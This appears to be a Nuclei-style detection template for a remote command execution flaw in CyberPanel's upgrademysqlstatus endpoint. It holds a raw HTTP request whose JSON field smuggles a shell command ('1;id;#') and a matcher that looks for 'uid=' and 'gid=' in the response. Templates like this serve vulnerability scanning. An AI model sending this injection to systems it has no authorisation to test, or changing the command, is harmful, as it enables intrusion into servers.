    - status_code==200 && contains_all(body,"uid=") && contains_all(body,"gid=")
    type: dsl
  raw:
  - 'GET /dataBases/upgrademysqlstatus HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101
    Firefox/131.0

    Content-Type: application/json

    Connection: close


    {"statusfile":"1;id;#"}

    '
id: cyberpanel-upgrademysqlstatus-rce
info:
  author: PokerSec
